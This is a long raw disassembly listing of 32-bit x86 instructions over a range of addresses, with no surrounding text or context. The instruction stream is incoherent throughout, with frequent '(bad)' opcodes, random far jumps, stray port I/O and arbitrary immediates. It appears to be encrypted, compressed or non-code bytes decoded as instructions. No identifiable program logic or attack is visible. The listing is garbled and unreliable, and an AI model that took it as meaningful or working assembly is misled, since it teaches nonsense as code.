  4191b1:	hlt    
  4191b2:	repnz and BYTE PTR [esi+0x26],dh
  4191b6:	jbe    0x419216
  4191b8:	mov    esp,0x363d7cb9
  4191bd:	xchg   ecx,eax
  4191be:	mov    ds:0x9b0169fc,al
  4191c3:	data16 into 
  4191c5:	sti    
  4191c6:	(bad)  
  4191c7:	jmp    DWORD PTR [esi]
  4191c9:	sbb    al,0xef
  4191cb:	sub    eax,DWORD PTR [eax]
  4191cd:	lods   al,BYTE PTR ds:[esi]
  4191ce:	test   al,0xa9
  4191d0:	lods   eax,DWORD PTR ds:[esi]
  4191d1:	add    DWORD PTR [ebp-0x9],edi
  4191d4:	xor    DWORD PTR [ebx],edx
  4191d6:	inc    ebx
  4191d7:	in     al,dx
  4191d8:	cdq    
  4191d9:	add    esp,DWORD PTR [edx]
  4191db:	cmp    DWORD PTR [edi],edi
  4191dd:	mov    dl,0x50
  4191df:	and    BYTE PTR [eax-0x7b48a115],bh
  4191e5:	dec    ebp
  4191e6:	pop    ecx
  4191e7:	rcr    dh,1
  4191e9:	xchg   ebp,eax
  4191ea:	jl     0x4191a4
  4191ec:	mov    dl,BYTE PTR [ebx-0x1b]
  4191ef:	call   0xb3364769
  4191f4:	sbb    dl,ch
  4191f6:	test   eax,0x24f31fed
  4191fb:	sub    al,0x7
  4191fd:	and    DWORD PTR es:[ebx-0x69682d4],edx
  419204:	dec    eax
  419205:	jl     0x419275
  419207:	into   
  419208:	mov    cl,0x5c
  41920a:	scas   eax,DWORD PTR es:[edi]
  41920b:	push   ebp
  41920c:	pop    ds
  41920d:	and    eax,0xa48286c2
  419212:	dec    esi
  419213:	daa    
  419214:	lea    eax,[edx+0x47]
  419217:	xchg   esp,eax
  419218:	(bad)  
  419219:	gs push 0x5f
  41921c:	lds    esp,FWORD PTR [edi-0x3931bf0d]
  419222:	test   bl,bl
  419224:	int    0x7d
  419226:	mov    edi,0x39197d8b
  41922b:	adc    al,0xbd
  41922d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41922e:	xchg   ecx,eax
  41922f:	(bad)  
  419230:	cmp    dh,BYTE PTR [eax+0x66]
  419233:	fcomp  DWORD PTR [ebx+ebx*1+0x18]
  419237:	mov    WORD PTR [esi+esi*4+0x234a9513],ss
  41923e:	(bad)  
  41923f:	push   ss
  419240:	add    cl,cl
  419242:	and    dl,BYTE PTR [edi-0x5b]
  419245:	cdq    
  419246:	sti    
  419247:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419248:	push   ds
  419249:	adc    ah,dh
  41924b:	outs   dx,DWORD PTR ds:[esi]
  41924c:	enter  0xc663,0x87
  419250:	add    BYTE PTR [edx+eax*2],bl
  419253:	mov    ds:0xabcf72bd,eax
  419258:	dec    esi
  419259:	sbb    edx,eax
  41925b:	cmp    al,bl
  41925d:	jle    0x4192c0
  41925f:	sar    BYTE PTR [ebx],1
  419261:	dec    esp
  419262:	mov    ah,0xda
  419264:	int    0x2e
  419266:	ficom  DWORD PTR [ebp+0x19ad6eb8]
  41926c:	(bad)  
  41926e:	push   ebx
  41926f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419270:	jb     0x419281
  419272:	nop
  419273:	stos   BYTE PTR es:[edi],al
  419274:	jb     0x4192b9
  419276:	fst    DWORD PTR [edi+ebp*4]
  419279:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41927a:	lahf   
  41927b:	bound  edi,QWORD PTR ds:0x5917f56d
  419281:	(bad)  
  419282:	and    dl,al
  419284:	push   ebx
  419285:	ja     0x4192aa
  419287:	imul   eax,DWORD PTR ds:0xde7bd8ab,0xc155964e
  419291:	jno    0x4192e3
  419293:	add    DWORD PTR [ebp-0x7c8d268c],ebx
  419299:	iret   
  41929a:	fisttp WORD PTR [ebp+0x16]
  41929d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41929e:	and    al,0xd2
  4192a0:	push   esi
  4192a1:	cmp    ch,BYTE PTR [edx-0x1dfa2f79]
  4192a7:	inc    ecx
  4192a8:	stc    
  4192a9:	xor    BYTE PTR [eax-0x13e5bd91],ah
  4192af:	dec    edx
  4192b0:	and    bh,bh
  4192b2:	mov    al,0x9d
  4192b4:	(bad)  
  4192b5:	rol    BYTE PTR ds:0x71712708,0x4f
  4192bc:	je     0x419291
  4192be:	in     eax,0x9e
  4192c0:	push   ds
  4192c1:	add    DWORD PTR [eax+0x14c184dd],0x9e669cd0
  4192cb:	push   ebx
  4192cc:	add    BYTE PTR [ebx+0x4212df67],dh
  4192d2:	(bad)  [eax+0x5ee18017]
  4192d8:	jno    0x419323
  4192da:	popf   
  4192db:	or     DWORD PTR [ebx-0x1a81aadc],esi
  4192e1:	mov    ebp,0xadd1f7c6
  4192e6:	xchg   esi,eax
  4192e7:	pop    ebx
  4192e8:	push   esi
  4192e9:	sub    al,dh
  4192eb:	jns    0x4192b1
  4192ed:	mov    edx,0xb332591c
  4192f2:	sbb    DWORD PTR ds:0x61b3e44c,0x865da827
  4192fc:	shr    esi,cl
  4192fe:	xchg   DWORD PTR [edx],edx
  419300:	les    esi,FWORD PTR ds:0xb6521fe2
  419306:	sbb    esp,esp
  419308:	inc    ebx
  419309:	(bad)  
  41930a:	cmp    al,0x76
  41930c:	(bad)  
  41930e:	ins    BYTE PTR es:[edi],dx
  41930f:	cmp    bl,BYTE PTR [ebx+0xf]
  419312:	add    edx,ebp
  419314:	dec    edi
  419315:	out    0x73,al
  419317:	mov    ah,0x51
  419319:	lods   eax,DWORD PTR ds:[esi]
  41931a:	add    eax,0x2db8a470
  41931f:	sbb    ah,cl
  419321:	fstp   st(6)
  419323:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419324:	pop    ebx
  419325:	repnz mov ?,WORD PTR ds:[esi+0x79]
  41932a:	xchg   ebx,eax
  41932b:	mov    DWORD PTR ds:0x74fd,edx
  419330:	bound  ebp,QWORD PTR [ebp-0x465090cc]
  419336:	mov    bh,0xeb
  419338:	jne    0x419367
  41933a:	push   ebx
  41933b:	mov    BYTE PTR [ecx+0x61],0x27
  41933f:	mov    edx,0x32e38b0f
  419344:	jecxz  0x419374
  419346:	je     0x4192d1
  419348:	add    ah,BYTE PTR [edi]
  41934a:	arpl   si,bx
  41934c:	repz or bh,BYTE PTR [ebx-0x17]
  419350:	ss mov ebx,0x693cc185
  419356:	clc    
  419357:	push   ecx
  419358:	pushf  
  419359:	cdq    
  41935a:	out    dx,al
  41935b:	xor    cl,cl
  41935d:	xchg   edx,eax
  41935e:	or     DWORD PTR [ebp-0x75],edx
  419361:	jmp    FWORD PTR [eax-0x6a]
  419364:	mov    esi,0xe1089302
  41936a:	xchg   ebx,eax
  41936b:	sub    DWORD PTR [edx],0x2eb289f2
  419371:	test   al,0x75
  419373:	jl     0x41936f
  419375:	jae    0x4193aa
  419377:	ja     0x4193f8
  419379:	not    BYTE PTR [esp+esi*2+0x76]
  41937d:	hlt    
  41937e:	js     0x4193c9
  419380:	mov    ebx,gs
  419382:	ds clc 
  419384:	or     edi,ebp
  419386:	mul    DWORD PTR [esi+0x7e4a3302]
  41938c:	adc    cl,BYTE PTR [eax-0x651592f1]
  419392:	lds    edi,FWORD PTR [edx]
  419394:	push   edi
  419395:	xor    eax,0xb96588f6
  41939a:	ror    edx,0xb6
  41939d:	jp     0x4193ac
  41939f:	test   eax,0x14a16a7f
  4193a4:	lea    eax,[ecx+esi*8-0x3e16fdf8]
  4193ab:	cdq    
  4193ac:	ficom  DWORD PTR [edi]
  4193ae:	ins    BYTE PTR es:[edi],dx
  4193af:	fnstcw WORD PTR [ecx]
  4193b1:	fld    DWORD PTR [esi-0x3b78ce26]
  4193b7:	test   eax,0x57b7c8fd
  4193bc:	push   esp
  4193bd:	jg     0x419388
  4193bf:	sub    BYTE PTR [edx],ch
  4193c1:	mov    ds:0xbd263a54,al
  4193c6:	pop    ecx
  4193c7:	gs adc eax,esi
  4193ca:	nop
  4193cb:	test   eax,0xbd4d0633
  4193d0:	aaa    
  4193d1:	inc    cl
  4193d3:	fcom   st(7)
  4193d5:	mov    eax,0x1ee578d9
  4193da:	push   edi
  4193db:	jbe    0x4193ac
  4193dd:	out    dx,al
  4193de:	ja     0x419397
  4193e0:	stc    
  4193e1:	iret   
  4193e2:	mov    edi,0x4cad87cb
  4193e7:	mov    ds:0xb6a2b05e,al
  4193ec:	cmp    eax,0xdb4fd5be
  4193f1:	xor    BYTE PTR [edx-0x5f],0x9e
  4193f5:	mov    esp,0x70877489
  4193fa:	push   esp
  4193fb:	and    DWORD PTR [eax-0x2f],edx
  4193fe:	ins    BYTE PTR es:[edi],dx
  4193ff:	dec    esp
  419400:	lock mov esi,edx
  419403:	into   
  419404:	or     ecx,ecx
  419406:	xor    BYTE PTR [edx+eiz*1-0x76429db4],dl
  41940d:	fistp  WORD PTR [ecx+eax*8]
  419410:	lods   eax,DWORD PTR ds:[esi]
  419411:	mov    DWORD PTR [eax-0x6454bc61],eax
  419417:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419418:	jmp    0xed57:0x52d664d9
  41941f:	stos   BYTE PTR es:[edi],al
  419420:	lock cmp eax,0x1938c504
  419426:	jns    0x4193fc
  419428:	sub    bh,ch
  41942a:	mov    cl,0x5
  41942c:	cmp    dl,bh
  41942e:	imul   edx,DWORD PTR [ecx+0x36e133f3],0xffffffb5
  419435:	sbb    BYTE PTR [edx-0x7958b8b9],al
  41943b:	test   DWORD PTR [ecx+ecx*2-0x2e],0x9229668b
  419443:	jno    0x419412
  419445:	mov    BYTE PTR gs:[eax],dl
  419448:	jns    0x4193eb
  41944a:	cdq    
  41944b:	sub    bl,BYTE PTR [ebx+0x33]
  41944e:	cmp    DWORD PTR [ebx],edi
  419450:	retf   0x83b5
  419453:	stos   DWORD PTR es:[edi],eax
  419454:	xchg   esi,eax
  419455:	dec    esp
  419456:	pop    edx
  419457:	cdq    
  419458:	sbb    DWORD PTR [ebp+0x6c],eax
  41945b:	aas    
  41945c:	mov    cs,eax
  41945e:	sub    BYTE PTR [ecx-0x70],al
  419461:	mov    esi,DWORD PTR [edi]
  419463:	add    DWORD PTR [ecx-0x69],edx
  419466:	jg     0x419453
  419468:	imul   esi,esp,0x6b19486f
  41946e:	loop   0x41940f
  419470:	retf   
  419471:	cs mov ebp,0x3507e26b
  419477:	push   ebx
  419478:	or     al,0x84
  41947a:	and    ebp,ebx
  41947c:	outs   dx,DWORD PTR ds:[esi]
  41947d:	pop    edx
  41947e:	push   edi
  41947f:	inc    ecx
  419480:	in     eax,0xe3
  419482:	xchg   ecx,eax
  419483:	clc    
  419484:	jnp    0x419468
  419486:	and    al,0x9a
  419488:	dec    eax
  419489:	stc    
  41948a:	xchg   DWORD PTR [ebp-0x2d],ebp
  41948d:	mov    al,0xa
  41948f:	jb     0x4194e4
  419491:	loopne 0x41941d
  419493:	aad    0x23
  419495:	cwde   
  419496:	icebp  
  419497:	test   DWORD PTR [edx+0x52],0xfbe9e705
  41949e:	inc    esi
  41949f:	or     esi,DWORD PTR [eax+0x30]
  4194a2:	add    BYTE PTR [ebx+0x78],0x6f
  4194a6:	adc    ah,BYTE PTR [edi-0x58]
  4194a9:	adc    al,0xd9
  4194ab:	cmp    DWORD PTR [eax-0x6c],esp
  4194ae:	not    DWORD PTR [edx+0x19]
  4194b1:	sahf   
  4194b2:	in     al,dx
  4194b3:	xchg   edi,eax
  4194b4:	stc    
  4194b5:	(bad)  
  4194b6:	mov    ds:0xf603e74,eax
  4194bb:	xor    esp,ecx
  4194bd:	mov    eax,ds:0xe90cfe54
  4194c2:	adc    eax,eax
  4194c4:	jns    0x4194c5
  4194c6:	imul   eax,DWORD PTR [edx+esi*8],0xffffffc6
  4194ca:	nop
  4194cb:	dec    eax
  4194cc:	in     eax,0x96
  4194ce:	aam    0x49
  4194d0:	adc    BYTE PTR ds:0xb4a1a44,ch
  4194d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4194d7:	out    dx,al
  4194d8:	and    al,0x98
  4194da:	cmp    BYTE PTR ds:0x564aef62,bl
  4194e0:	cwde   
  4194e1:	mov    ah,0x89
  4194e3:	out    0x81,al
  4194e5:	sub    cl,BYTE PTR [eax]
  4194e7:	push   esp
  4194e8:	or     eax,0xe60503e4
  4194ed:	push   0x61b17b6d
  4194f2:	shl    BYTE PTR [esi-0x4b],1
  4194f5:	not    BYTE PTR [edx]
  4194f7:	(bad)  
  4194f8:	mov    ebx,0x3d6ad950
  4194fd:	mov    esp,0x20ea816c
  419502:	dec    eax
  419503:	xchg   sp,ax
  419505:	mov    BYTE PTR [ecx+0x57352b3f],cl
  41950b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41950c:	ds mov cl,0x83
  41950f:	pop    ecx
  419510:	popa   
  419511:	mov    cl,0x6b
  419513:	cmp    BYTE PTR [esi-0x6f],0x2
  419517:	ret    
  419518:	mov    eax,ds:0x23c3461c
  41951d:	scas   eax,DWORD PTR es:[edi]
  41951e:	outs   dx,DWORD PTR ds:[esi]
  41951f:	(bad)  
  419520:	cs inc ecx
  419522:	das    
  419523:	test   BYTE PTR [edx-0x5f86f42f],dh
  419529:	push   es
  41952a:	add    al,0x3
  41952c:	mov    bl,0x2e
  41952e:	sbb    edx,esi
  419530:	cmp    al,BYTE PTR [ebx+ebp*8]
  419533:	mov    edi,0xa24b65e2
  419538:	rol    DWORD PTR [edx+0x7f284279],cl
  41953e:	cmp    ch,cl
  419540:	lock pop ss
  419542:	lods   eax,DWORD PTR ds:[esi]
  419543:	(bad)  
  419544:	push   cs
  419545:	cmp    DWORD PTR [ebx*4-0x41d5d5b7],ecx
  41954c:	jb     0x419550
  41954e:	mov    edx,0x93094754
  419553:	mov    ebp,0x16082ec9
  419558:	ds call 0xc691398b
  41955e:	popa   
  41955f:	neg    DWORD PTR [edi]
  419561:	sub    al,0x30
  419563:	(bad)  
  419564:	iret   
  419565:	int    0x1b
  419567:	mov    dh,0xe7
  419569:	mov    BYTE PTR [ebx],cl
  41956b:	push   es
  41956c:	js     0x4195a2
  41956e:	sbb    DWORD PTR [ecx+0x55c19f0b],ebp
  419574:	cmp    dl,cl
  419576:	call   0xb44fdcf3
  41957b:	pop    ecx
  41957c:	ins    BYTE PTR es:[edi],dx
  41957d:	sbb    al,0x27
  41957f:	push   eax
  419580:	loop   0x419518
  419582:	in     eax,0x4e
  419584:	mov    ah,0xfe
  419586:	rol    DWORD PTR [edx],cl
  419588:	mov    ?,ecx
  41958a:	imul   esp,ebx,0x7b
  41958d:	mov    bl,0x0
  41958f:	and    edi,DWORD PTR [ebp+0x6a]
  419592:	xchg   esi,eax
  419593:	int    0x28
  419595:	test   eax,0xa7718ac3
  41959a:	push   esp
  41959b:	addr16 cdq 
  41959d:	xchg   esp,eax
  41959e:	pop    ds
  41959f:	pop    edi
  4195a0:	fild   DWORD PTR [edx+0x5c1a402]
  4195a6:	scas   eax,DWORD PTR es:[edi]
  4195a7:	inc    BYTE PTR gs:[edx+0x2a]
  4195ab:	mov    DWORD PTR [edx-0x1c],0xf0f4aae8
  4195b2:	mov    edi,0x56e253e0
  4195b7:	push   eax
  4195b8:	mov    al,0x17
  4195ba:	inc    edx
  4195bb:	push   esi
  4195bc:	mov    WORD PTR [ebx-0x7c],es
  4195bf:	icebp  
  4195c0:	stos   DWORD PTR es:[edi],eax
  4195c1:	mov    ebp,DWORD PTR [eax]
  4195c3:	mov    bh,dl
  4195c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4195c6:	popa   
  4195c7:	lods   eax,DWORD PTR ds:[esi]
  4195c8:	or     eax,0x5e7f0fed
  4195cd:	mov    bl,BYTE PTR [ecx-0x50]
  4195d0:	retf   0xee3f
  4195d3:	mov    ds:0x19ec17e5,eax
  4195d8:	jecxz  0x4195b8
  4195da:	aad    0x19
  4195dc:	int    0x67
  4195de:	cdq    
  4195df:	int    0xb6
  4195e1:	(bad)  
  4195e2:	mov    cl,0xbe
  4195e4:	xchg   edx,eax
  4195e5:	sbb    BYTE PTR [esi-0x1798494a],al
  4195eb:	adc    bl,BYTE PTR [esi]
  4195ed:	jnp    0x4195ac
  4195ef:	sbb    eax,0x313eda65
  4195f4:	push   ecx
  4195f5:	pushf  
  4195f6:	sbb    eax,DWORD PTR [ebx+edi*8+0x8745bf6]
  4195fd:	jmp    0x4195f9
  4195ff:	mov    dl,0xae
  419601:	dec    esi
  419602:	ins    DWORD PTR es:[edi],dx
  419603:	in     al,0xa4
  419605:	push   0x1f493f86
  41960a:	and    DWORD PTR [edx+0x189597b0],ecx
  419610:	dec    ebx
  419611:	clc    
  419612:	(bad)  
  419613:	cmp    esi,DWORD PTR [esi]
  419615:	mov    ds:0xa13bf40e,al
  41961a:	sub    eax,0xd7c5e0ed
  41961f:	sub    BYTE PTR [ecx],ah
  419621:	fistp  WORD PTR [edx]
  419623:	mov    BYTE PTR [esi],0xa4
  419626:	fxch   st(4)
  419628:	push   edi
  419629:	sahf   
  41962a:	mov    dh,BYTE PTR [eax-0x6e]
  41962d:	inc    ebx
  41962e:	jmp    0x7787b3e1
  419633:	mov    BYTE PTR [eax+0x7e5447f7],dl
  419639:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41963a:	dec    esi
  41963b:	dec    esi
  41963c:	stc    
  41963d:	pop    ecx
  41963e:	aaa    
  41963f:	sbb    DWORD PTR [edi+ecx*1-0x47],esp
  419643:	ficom  DWORD PTR [ebx+0x62]
  419646:	dec    ebx
  419647:	cmp    bh,bh
  419649:	out    dx,al
  41964a:	nop
  41964b:	mov    edi,0x2cd36ac8
  419650:	fs in  al,dx
  419652:	mov    ds:0x31f9bf00,al
  419657:	mov    dh,0x60
  419659:	mov    ch,0x49
  41965b:	sub    DWORD PTR [ebp+esi*1+0x7b],0xffffffe7
  419660:	enter  0xd58a,0x11
  419664:	fnstcw WORD PTR [esi-0x1a]
  419667:	leave  
  419668:	cmp    DWORD PTR [esi+0x3b],ebp
  41966b:	sbb    ebx,0x5
  41966e:	int3   
  41966f:	lock outs dx,DWORD PTR ds:[esi]
  419671:	mov    edx,DWORD PTR [edi+0x2cf0653]
  419677:	(bad)  
  419678:	into   
  419679:	mov    dl,0xa8
  41967b:	out    0x2,eax
  41967d:	int    0x14
  41967f:	jo     0x419629
  419681:	lods   al,BYTE PTR ds:[esi]
  419682:	push   0x13c072d7
  419687:	or     edi,DWORD PTR [ecx+0x347d808b]
  41968d:	push   esi
  41968e:	aaa    
  41968f:	cdq    
  419690:	and    dh,al
  419692:	xchg   edi,eax
  419693:	push   ecx
  419694:	imul   ebp,DWORD PTR [eax+0x6a],0x968cf452
  41969b:	dec    edx
  41969c:	(bad)
  4196a1:	mov    cl,0xdc
  4196a3:	xchg   esp,eax
  4196a4:	jo     0x4196ee
  4196a6:	and    ah,BYTE PTR [eax+edx*2]
  4196a9:	adc    al,0x6
  4196ab:	rcl    BYTE PTR [ebp+0x58],1
  4196ae:	and    esp,DWORD PTR [eax-0x70e45193]
  4196b4:	sub    al,BYTE PTR [edi+0x22]
  4196b7:	adc    BYTE PTR [edi+0x63ae685],0x34
  4196be:	lods   al,BYTE PTR ds:[esi]
  4196bf:	push   ds
  4196c0:	retf   
  4196c1:	sub    DWORD PTR [ecx-0x37daf2de],ecx
  4196c7:	add    bl,ah
  4196c9:	pusha  
  4196ca:	push   eax
  4196cb:	(bad)  
  4196cc:	and    eax,0x34fc877c
  4196d1:	dec    ecx
  4196d2:	int    0xc6
  4196d4:	fnstenv [ebx+0x3654adb4]
  4196da:	ins    DWORD PTR es:[edi],dx
  4196db:	retf   
  4196dc:	jg     0x4196b9
  4196de:	or     al,0x8d
  4196e0:	dec    ebp
  4196e1:	(bad)  [esi-0x398b1cc9]
  4196e7:	mov    ch,0xef
  4196e9:	fstp   DWORD PTR [ebx+0x7e]
  4196ec:	jns    0x4196bd
  4196ee:	ret    
  4196ef:	mov    edx,0xc6c5dd68
  4196f4:	mov    ecx,0x60e9f4a
  4196f9:	or     al,bl
  4196fb:	sar    BYTE PTR [esi],1
  4196fd:	dec    esi
  4196fe:	xor    eax,0x52c34a57
  419703:	xor    edx,DWORD PTR [eax]
  419705:	push   esi
  419706:	sub    al,0xfa
  419708:	fiadd  WORD PTR [ecx-0x20c6babc]
  41970e:	in     al,0x27
  419710:	add    edi,DWORD PTR [ebx+0x7c43ac97]
  419716:	in     al,0x5c
  419718:	pop    edi
  419719:	push   0x7e01abab
  41971e:	rcl    BYTE PTR [ecx],0x2b
  419721:	jl     0x419745
  419723:	push   ebx
  419724:	pushf  
  419725:	fwait
  419726:	xchg   ebx,eax
  419727:	pushf  
  419728:	pushf  
  419729:	fisttp WORD PTR [esi-0x3d4b5505]
  41972f:	stos   BYTE PTR es:[edi],al
  419730:	jns    0x419717
  419732:	in     eax,dx
  419733:	or     DWORD PTR [edx+0x4e5a5240],edx
  419739:	or     BYTE PTR fs:[ecx],dh
  41973c:	push   es
  41973d:	jns    0x419709
  41973f:	retf   
  419740:	bound  ecx,QWORD PTR [ebx]
  419742:	(bad)  
  419744:	mov    DWORD PTR [ebx],ecx
  419746:	pop    ds
  419747:	aam    0xdf
  419749:	add    DWORD PTR [edx+0x37],edi
  41974c:	loopne 0x41972c
  41974e:	(bad)  
  41974f:	lds    eax,FWORD PTR [edx+0x28]
  419752:	push   ecx
  419753:	int    0x86
  419755:	adc    cl,BYTE PTR [edi-0x4b]
  419758:	xor    BYTE PTR [eax+ebx*4-0x54],0x72
  41975d:	pop    eax
  41975e:	xchg   ebp,eax
  41975f:	push   es
  419760:	cmc    
  419761:	xchg   ebp,eax
  419762:	pop    ebp
  419763:	mov    ds:0x4fb07cd6,eax
  419768:	xlat   BYTE PTR ds:[ebx]
  419769:	popa   
  41976a:	call   0xd1f4:0xf3cd87f8
  419771:	repz icebp 
  419773:	xor    eax,0x5083046c
  419778:	jb     0x41976c
  41977a:	bnd ja 0x419781
  41977d:	mov    edx,0x89d357ba
  419782:	data16 mov bh,0x57
  419785:	xor    ch,dl
  419787:	call   0x4d96:0x263e7d9e
  41978e:	ds inc ebp
  419790:	mov    cl,0x9
  419792:	or     eax,0xac6f1fd9
  419797:	adc    al,0x4f
  419799:	add    DWORD PTR [ecx],ebx
  41979b:	push   DWORD PTR [ebp-0x7f3527d8]
  4197a1:	repz mov ebp,0x91c4dd6
  4197a7:	popf   
  4197a8:	jp     0x4197b0
  4197aa:	cwde   
  4197ab:	outs   dx,DWORD PTR ds:[esi]
  4197ac:	sbb    eax,0x3a4ed721
  4197b1:	jno    0x41981d
  4197b3:	adc    ebx,DWORD PTR [edx-0x29]
  4197b6:	xchg   esi,ebp
  4197b8:	(bad)  
  4197b9:	cmp    al,0xf2
  4197bb:	inc    BYTE PTR [esi-0x4e]
  4197be:	mov    ds:0xf62ebc02,eax
  4197c3:	push   0x72fec961
  4197c8:	sbb    ebp,DWORD PTR [esp+eiz*8-0x138ce13f]
  4197cf:	ficom  DWORD PTR [ecx]
  4197d1:	pop    edi
  4197d2:	lods   eax,DWORD PTR ds:[esi]
  4197d3:	mov    ecx,0x58c7b258
  4197d8:	pop    edi
  4197d9:	add    dh,bl
  4197db:	pop    esi
  4197dc:	sub    al,0x2e
  4197de:	fstp   QWORD PTR [ecx]
  4197e0:	mov    ecx,0xb35cff66
  4197e5:	js     0x419832
  4197e7:	mov    dh,0x4f
  4197e9:	in     eax,dx
  4197ea:	add    esp,esi
  4197ec:	clc    
  4197ed:	scas   al,BYTE PTR es:[edi]
  4197ee:	mov    bl,0x3c
  4197f0:	repz into 
  4197f2:	mov    DWORD PTR [edi+0x32],ebx
  4197f5:	mov    cl,0xef
  4197f7:	mov    eax,eax
  4197f9:	and    esi,DWORD PTR [esi+0x5c]
  4197fc:	lods   al,BYTE PTR ds:[esi]
  4197fd:	fcom   QWORD PTR [ecx-0x2c]
  419800:	out    dx,eax
  419801:	imul   ebx,DWORD PTR [esi],0x79647f2e
  419807:	jmp    0x156:0x19bc0ba0
  41980e:	push   0x7b
  419810:	call   0xd2ce5872
  419815:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419816:	nop
  419817:	scas   al,BYTE PTR es:[edi]
  419818:	(bad)  
  419819:	mov    ds:0x50c0b89c,al
  41981e:	push   esp
  41981f:	sbb    al,0xbb
  419821:	push   0xfffffff1
  419823:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419824:	mov    edi,0x368e4f75
  419829:	ss push ds
  41982b:	fwait
  41982c:	mov    ebp,0xb21b533e
  419831:	lds    esi,FWORD PTR [ecx]
  419833:	dec    ebp
  419834:	add    eax,0xcec38ee4
  419839:	adc    eax,0xd23d1f46
  41983e:	les    eax,FWORD PTR [ecx+0x609609cc]
  419844:	in     eax,dx
  419845:	sahf   
  419846:	or     eax,esp
  419848:	iret   
  419849:	call   0xbc51:0xa1d71c25
  419850:	pop    edi
  419851:	cwde   
  419852:	ins    DWORD PTR es:[edi],dx
  419853:	in     eax,dx
  419854:	or     DWORD PTR [ebp-0x4ba43914],0x50d09c67
  41985e:	inc    eax
  41985f:	fisubr DWORD PTR fs:[edx+0x11]
  419863:	pop    ss
  419864:	lods   eax,DWORD PTR ds:[esi]
  419865:	fistp  QWORD PTR [edi+0x432c43fa]
  41986b:	rcl    DWORD PTR [edx],1
  41986d:	xchg   esp,eax
  41986e:	ror    BYTE PTR [edi],1
  419870:	inc    edx
  419871:	arpl   WORD PTR [ecx+0x7a],bp
  419874:	ja     0x4198d8
  419876:	and    esi,DWORD PTR [ecx+0x2e]
  419879:	fsub   DWORD PTR [esi-0x1174ae76]
  41987f:	ret    0xbfce
  419882:	retf   0xbdeb
  419885:	mov    ds:0xf9bdc3f5,al
  41988a:	or     eax,0x93eb044
  41988f:	and    edi,DWORD PTR [edi-0x3ba1a05f]
  419895:	sbb    eax,0x7e2d58c1
  41989a:	xchg   edx,eax
  41989b:	xchg   esi,eax
  41989c:	jecxz  0x4198f8
  41989e:	push   0x44b3a45d
  4198a3:	mov    ebx,0x2913cc39
  4198a8:	mov    bl,0xd8
  4198aa:	jmp    0x626e:0x487d6091
  4198b1:	ds mov ecx,0xf1a73f4e
  4198b7:	mov    dh,0xfd
  4198b9:	out    dx,al
  4198ba:	sbb    DWORD PTR [esp+edi*2-0x5dc0e078],esi
  4198c1:	lods   eax,DWORD PTR ds:[esi]
  4198c2:	push   ecx
  4198c3:	mov    edx,DWORD PTR [esi+0x5598e5f4]
  4198c9:	jmp    0x419930
  4198cb:	jbe    0x41986a
  4198cd:	mov    dl,bh
  4198cf:	aas    
  4198d0:	sub    dl,ch
  4198d2:	std    
  4198d3:	imul   esi,DWORD PTR [ebx],0x21
  4198d6:	js     0x419876
  4198d8:	out    dx,eax
  4198d9:	pop    esi
  4198da:	xchg   esi,eax
  4198db:	mov    bh,al
  4198dd:	js     0x4198c2
  4198df:	loopne 0x41987d
  4198e1:	out    0x47,al
  4198e3:	stc    
  4198e4:	retf   
  4198e5:	xchg   ebp,eax
  4198e6:	or     esp,DWORD PTR [ebx-0x6f]
  4198e9:	sub    eax,0xb805ca5
  4198ee:	add    BYTE PTR [ecx-0x933d896],bl
  4198f4:	(bad)
  4198f7:	(bad)  
  4198f8:	mov    bl,0x2c
  4198fa:	jo     0x41990f
  4198fc:	push   ebp
  4198fd:	add    al,0xe2
  4198ff:	mov    eax,ds:0x51eb9237
  419904:	ins    BYTE PTR es:[edi],dx
  419905:	fs pushf 
  419907:	inc    edi
  419908:	inc    eax
  419909:	cmp    DWORD PTR [esi],0xa2cc36e1
  41990f:	je     0x4198d6
  419911:	mov    dl,0xb7
  419913:	push   edi
  419914:	out    0x84,al
  419916:	sub    ebp,ecx
  419918:	jl     0x419922
  41991a:	out    0x47,al
  41991c:	mov    ch,0x6e
  41991e:	shl    ecx,0xc0
  419921:	(bad)  
  419922:	xchg   esp,eax
  419923:	push   ds
  419924:	in     eax,dx
  419925:	dec    ebx
  419926:	lahf   
  419927:	cld    
  419928:	fisttp QWORD PTR [edi+0x43581a73]
  41992e:	sar    DWORD PTR ds:0x85f561a9,0xf2
  419935:	mov    BYTE PTR [esi+eax*4+0x7d],ch
  419939:	jg     0x41993b
  41993b:	js     0x4198fe
  41993d:	fisubr DWORD PTR [ebx]
  41993f:	xchg   edx,eax
  419940:	enter  0x7424,0x62
  419944:	xor    esi,DWORD PTR [esi+edx*1+0x1994e6f5]
  41994b:	mul    BYTE PTR [esp+ebp*8-0x3138d758]
  419952:	dec    ecx
  419953:	adc    ch,BYTE PTR [ebx+0x56]
  419956:	pop    ecx
  419957:	push   0xffffffc0
  419959:	sbb    al,BYTE PTR [esi+0x21]
  41995c:	add    esi,DWORD PTR [eax+0x72]
  41995f:	hlt    
  419960:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419961:	sahf   
  419962:	std    
  419963:	jns    0x4198f2
  419965:	sar    BYTE PTR [ebp+0x48d1828f],cl
  41996b:	out    0xbc,al
  41996d:	(bad)  
  41996e:	sti    
  41996f:	mov    WORD PTR [esp+ecx*1],?
  419972:	lods   al,BYTE PTR ds:[esi]
  419973:	push   ss
  419974:	aam    0x5f
  419976:	jo     0x41992a
  419978:	aaa    
  419979:	adc    eax,0x6a7fe68a
  41997e:	dec    ebp
  41997f:	mov    edi,0x32dbb725
  419984:	mov    edi,0x696c0441
  419989:	add    ecx,esp
  41998b:	ins    DWORD PTR es:[edi],dx
  41998c:	jmp    0x41990f
  41998e:	(bad)  
  41998f:	pop    ss
  419990:	out    dx,eax
  419991:	inc    ecx
  419992:	xor    DWORD PTR [esi],ebp
  419994:	xor    eax,0xae4edee8
  419999:	popa   
